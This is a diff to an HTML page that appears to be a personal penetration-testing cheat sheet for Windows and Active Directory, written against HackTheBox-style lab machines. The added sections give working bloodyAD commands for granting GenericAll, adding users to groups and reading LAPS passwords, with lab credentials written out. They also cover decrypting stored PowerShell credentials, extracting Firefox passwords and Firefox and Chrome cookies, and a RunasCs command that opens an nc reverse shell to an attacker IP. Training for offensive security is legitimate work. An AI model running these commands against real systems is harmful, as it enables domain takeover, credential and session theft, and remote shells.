@@ -64,6 +64,7 @@ Invoke-AllChecks</code></pre>
                         <pre><code class="language-powershell">sc query windefend #Shows if windows defender is running</code></pre>
                         <pre><code class="language-powershell">Get-LAPSComputers  #Shows which computers use LAPS</code></pre>
                         <pre><code class="language-powershell">tasklist /svc  #Show processes. It may help us to find a CVE for a specific software running in the host</code></pre>
+                        <pre><code class="language-powershell">tree /F  #Show all files in the current folders in tree format</code></pre>
                         <pre><code class="language-powershell">gci C:\ -Recurse -Directory -ea 0 | % { $p="$($_.FullName)\t.txt"; try { ni $p -ItemType File -ea Stop | Out-Null; ri $p -Force; "[+] $($_.FullName)" } catch {} } #Show writeable folders</code></pre>
                         
 
@@ -556,6 +557,11 @@ C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe</code
                         <ul>
                             <p>In case you found that you cant spawn a shell using evilwinrm or psexec you can make use of Bloody AD to perform changes inside the domain. In that case having in mind that we have "GenericAll" permision over a group we can add a user to that group</p>
                             <pre><code class="language-bash">bloodyAD --host 10.129.232.88 -u 'p.agila' -d fluffy.htb -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' j.fleischman</code></pre>
+                            <p>In case you see that you don't have permissions to add a user to that group you <b>own</b> you could grante genericall over a selected user and then add the user to the group</p>
+                            <pre><code class="language-powershell">bloodyAD --host 10.129.37.17 -d streamio.htb -u JDgodd -p JDg0dd1s@d0p3cr3@t0r add genericAll "CN=CORE STAFF,CN=USERS,DC=STREAMIO,DC=HTB" JDgodd #Adding genericall
+bloodyAD --host 10.129.37.17 -d streamIO.htb -u JDgodd -p JDg0dd1s@d0p3cr3@t0r add groupMember 'CORE STAFF' JDgodd #Adding the user to that group you want
+                            </code></pre>
+                             
                             <h4>PowerView</h4>
                             <ul>
                                 <p>Take password of the user you control and create a variable that we will use later</p>
@@ -628,6 +634,13 @@ $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\dam
                             <p>Then apply a password change with bloodAD and the user is yourse :)</p>
                         </ul>
 
+                        <h3>Retreiving LAPS password</h3>
+                        <ul>
+                            <p>In case you have <b>ReadLAPSPassword</b> over the DC o another computer you could be able to read the LAPS password</p>
+                            <pre><code class="language-bash">bloodyAD --host 10.129.37.17 -d streamIO.htb -u JDgodd -p JDg0dd1s@d0p3cr3@t0r get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime</code></pre>
+                            <p>Now use that password with netexec. <b>Remember to enclose it with 'password'</b></p>
+                        </ul>
+
                     </ul>
 
                     <h2 id="Credential hunting">Credential hunting</h2>
@@ -659,6 +672,13 @@ Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction 
                             <pre><code class="language-cmd">reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</code></pre>
                         </ul>
 
+                        <h3>Powershell password decrypt</h3>
+                        <ul>
+                            <p>In some times you'll find some sort of encoded password in powershell you could decode it using</p>
+                            <pre><code class="language-cmd">PS C:\users\sfitz\documents> $cred = Import-Clixml -Path C:\users\sfitz\documents\connection.xml
+PS C:\users\sfitz\documents> $cred.GetNetworkCredential().Password</code></pre>
+                        </ul>
+
                         <h3>Sticky notes</h3>
                         <ul>
                             <p>Sometimes we can find sticky notes. The information of that notes is saves in</p>
@@ -683,18 +703,33 @@ PS C:\htb> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft 
 
                         <h3>Mozilla Firefox credentials</h3>
                         <ul>
-                            <p>Mozilla firefox stores credentials in a sqlite database we can copy the database in our current directory by using the following command</p>
+                            <h4>Passwords</h4>
+                            <ul>
+                                 <p>Using the following <a class="notion-link" href="https://github.com/lclevy/firepwd">repo</a> we are able to extract the credentials. To do so access the following path</p>  
+                                 <pre><code class="language-cmd">C:\Users\username\AppData\Roaming\Mozilla\Firefox\Profiles\</code></pre>
+                                 <p>And download the <b>login.json and key4.db</b> remeber to situate them in the same folder where your firepwd is. And then run</p>
+                                 <pre><code class="language-bash">python3 firepwd.py</code></pre>
+                                 
+                            </ul>
+                            
+                            <h4>Cookies</h4>
+                            <ul>
+                            <p>Mozilla firefox stores cookies in a sqlite database we can copy the database in our current directory by using the following command</p>
                             <pre><code class="language-cmd">copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .</code></pre>
                             <p>Now we can extract it's content by using cookieextractor.py</p>
                             <pre><code class="language-bash">python3 cookieextractor.py --dbpath "/mnt/hgfs/vmwareshared/cookies.sqlite"
 #output
 (10, '', 'd', '$COOKIEEEEE', '.api.slacktestapp.com', '/', 7975292868, 1663945037085000, 1663945037085002, 0, 0, 0, 1, 0, 2)</code></pre>
                             <p>Here you can see also the web where the cookie comes from. We can visit that website (can only be locally in the target machine) and edit the cookie using any extension</p>
-                            
+
                             <p>We can also use <a class="notion-link" href="https://github.com/djhohnstein/SharpChromium/blob/master/ChromiumCredentialManager.cs#L47">SharpChromium</a></p>
-                            <pre><code class="language-cmd">copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"  #Copy the path to make Sharpchromium work
-                            Import-Module .\SharpChromium
-                            Invoke-SharpChromium -Command "cookies slack.com"    </code></pre>    
+                                <pre><code class="language-cmd">copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"  #Copy the path to make Sharpchromium work
+Import-Module .\SharpChromium
+Invoke-SharpChromium -Command "cookies slack.com"    </code></pre> 
+                            </ul>
+
+                            
+                            
                         </ul>
 
                         <h3>Keypass database</h3>
@@ -738,6 +773,22 @@ Security settings
                             
                         </ul>
                         
+                    </ul>
+
+                    <h2 id="Run commands as another user Runas.exe">Run commands as another user Runas.exe</h2>
+                    <ul>
+                        <p>In case you are in an environment where you have credentials for another user but you are not able to stablish a connection though another port or similar there are some ways to execute commands as another user</p>
+                        <h3>Meh option</h3>
+                        <ul>
+                            <p>You could use LOL tools in order to stablish a reverse shell. This option is good but it may fail due the instability of the shell</p>
+                            <pre><code class="language-powershell">Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami } </code></pre>
+                        </ul>
+
+                        <h3>Great option</h3>
+                        <ul>
+                            <p>Using RunasCs.exe it's a good option but we should use nc to stablish a proper shell</p>
+                            <pre><code class="language-powershell">.\RunasCs.exe USER PASSWORD "C:\users\public\documents\nc.exe 10.10.14.91 5555 -e cmd.exe" -t 0</code></pre>
+                        </ul>
                     </ul>
 
                     <h2 id="Enumerating with cmdkey (Stored credentials)">Enumerating with cmdkey (Stored credentials)</h2>
